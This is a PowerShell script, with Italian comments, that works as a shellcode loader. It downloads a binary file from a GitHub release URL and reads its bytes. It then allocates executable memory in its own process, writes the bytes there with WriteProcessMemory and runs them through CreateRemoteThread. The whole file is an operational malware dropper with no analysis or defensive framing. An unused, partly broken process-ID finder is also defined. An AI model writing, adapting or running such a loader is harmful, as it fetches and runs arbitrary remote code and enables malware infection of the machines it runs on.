# Definire le funzioni di sistema utilizzando Add-Type
Add-Type @"
using System;
using System.Text;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

    public delegate bool EnumWindowsProc(IntPtr hwnd, IntPtr lParam);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out int lpdwProcessId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
}
"@

function Find-ProcessIDByClassName2 {
    param (
        [string]$className
    )

    $pid2 = [ref]0
    $enumDelegate = [Win32+EnumWindowsProc]{
        param ($hwnd, $lParam)
        $windowClassName2 = New-Object 'System.Text.StringBuilder' 256
        [Win32]::GetClassName($hwnd, $windowClassName2, $windowClassName2.Capacity) | Out-Null
        if ($windowClassName2.ToString() -eq $className) {
            $processId2 = 0
            [Win32]::GetWindowThreadProcessId($hwnd, [ref]$processId2)
            $lParam = [System.IntPtr]::new($processId2)
            return $false
        }
        return $true
    }

    $callback = [System.Runtime.InteropServices.GCHandle]::Alloc($enumDelegate)
    [Win32]::EnumWindows($enumDelegate, [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($pid2))
    $callback.Free()
    return $pid2.Value
}

function IceTeaStartext {
    $url = "https://github.com/Vittix07/Xcap5/releases/download/Xcap/xcap.dat"
    try {
        $response = Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile "0.dat"
    }
    catch {
        throw "Failed to download file: $_"
    }
    
    try {
        $byteArray = [System.IO.File]::ReadAllBytes("0.dat")
    }
    catch {
        throw "Failed to read file as bytes: $_"
    }

    if ($byteArray.Length -eq 0) {
        throw "Shellcode is empty or not properly converted."
    }
    
    $shc_size = [uint32]$byteArray.Length

    # Iniezione del file shellcode nel processo PowerShell stesso
    $hProcess = [System.Diagnostics.Process]::GetCurrentProcess().Handle
    $remote_buf = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $shc_size, 0x3000, 0x40)
    if ($remote_buf -eq [IntPtr]::Zero) {
        throw "VirtualAllocEx failed"
    }
    
    $bytesWritten = [UIntPtr]::Zero
    $writeResult = [Win32]::WriteProcessMemory($hProcess, $remote_buf, $byteArray, $shc_size, [ref]$bytesWritten)
    if (-not $writeResult -or $bytesWritten -eq [UIntPtr]::Zero) {
        throw "WriteProcessMemory failed"
    }
    
    $threadId = [uint32]0
    $hMyThread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $remote_buf, [IntPtr]::Zero, 0, [ref]$threadId)
    if ($hMyThread -eq [IntPtr]::Zero) {
        throw "CreateRemoteThread failed"
    }
}

# Esegui l'operazione principale
IceTeaStartext
